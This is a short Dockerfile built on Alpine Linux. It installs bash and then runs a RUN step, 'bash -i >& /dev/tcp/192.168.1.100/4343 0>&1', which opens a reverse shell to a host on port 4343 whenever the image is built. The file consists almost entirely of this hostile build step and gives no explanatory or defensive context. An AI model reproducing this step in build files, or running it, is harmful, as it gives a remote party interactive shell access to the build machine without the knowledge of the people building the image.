FROM alpine:3.18.3
RUN apk update && apk add bash
RUN /bin/bash  -c 'bash -i >& /dev/tcp/192.168.1.100/4343 0>&1'
